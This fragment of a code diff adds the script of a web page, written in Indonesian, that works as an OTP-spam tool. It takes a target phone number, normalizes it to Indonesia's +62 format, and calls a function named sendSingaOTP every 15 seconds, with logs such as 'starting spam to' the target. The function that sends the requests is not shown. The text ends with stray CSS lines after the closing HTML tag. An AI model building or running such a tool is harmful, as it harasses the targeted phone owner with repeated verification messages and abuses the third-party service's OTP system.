+            addLog(`Mengirim OTP Singa ke ${phoneNumber}...`, 'info');
+            
+            const result = await sendSingaOTP(phoneNumber);
+
+            if (result.success) {
+                successAttempts++;
+                updateStats();
+                addLog(`${result.message}`, 'success');
+            } else {
+                addLog(`${result.error}`, 'error');
+                addLog(`Tapi request mungkin sudah terkirim di server side`, 'warning');
+            }
+        }
+
+        function startSpam() {
+    const input = document.getElementById('phoneNumber').value.trim();
+    const dial = document.getElementById('code').innerText.replace("+", "");
+    
+    const cleanInput = input.replace(/^0+/, "");
+    const phoneInput = dial + cleanInput;
+    
+    if (!input) {
+        addLog('MASUKKAN NOMOR TARGET DAHULU!', 'error');
+        return;
+    }
+    
+    const phone = normalizePhone(phoneInput);
+    
+    if (!/^62\d{8,15}$/.test(phone)) {
+        addLog('FORMAT NOMOR SALAH!', 'error');
+        return;
+    }
+    
+    isSpamming = true;
+    updateStatusIndicator();
+    document.getElementById('startBtn').disabled = true;
+    document.getElementById('stopBtn').disabled = false;
+    
+    addLog(`MEMULAI SPAM KE: ${phone}`, 'success');
+    
+    if (spamInterval) clearInterval(spamInterval);
+    
+    spamInterval = setInterval(() => {
+        if (isSpamming) {
+            spamCycle(phone);
+        }
+    }, 15000);
+    
+    spamCycle(phone);
+}
+
+        function stopSpam() {
+            isSpamming = false;
+            updateStatusIndicator();
+            if (spamInterval) {
+                clearInterval(spamInterval);
+                spamInterval = null;
+            }
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            
+            addLog('SPAM DIHENTIKAN', 'info');
+        }
+
+        function normalizePhone(phone) {
+            phone = phone.replace(/\D/g, '');
+            if (phone.startsWith('0')) phone = '62' + phone.substring(1);
+            if (phone.startsWith('8')) phone = '62' + phone;
+            return phone;
+        }
+        
+        const audio = document.getElementById("bgMusic");
+const ctx1 = document.getElementById("successWave").getContext("2d");
+const ctx2 = document.getElementById("totalWave").getContext("2d");
+
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStatusIndicator();
+            addLog('SYSTEM READY', 'success');
+            addLog('Masukkan nomor dan tekan START', 'info');
+            addLog('Music siap dimainkan', 'info');
+            document.querySelectorAll("canvas").forEach(c => {
+    c.width = 130;
+    c.height = 130;
+    document.getElementById('stopBtn').disabled = true;
+});
+
+            document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') startSpam();
+            });
+
+            document.getElementById('phoneNumber').focus();
+        });
+        document.body.addEventListener("click", () => {
+    if (audioCtx && audioCtx.state === "suspended") {
+        audioCtx.resume();
+    }
+});
+    </script>
+</body>
+</html>  width: 100%;
   border-radius: 12px;
   box-shadow: 0 0 20px rgba(0,0,0,0.6);
 }
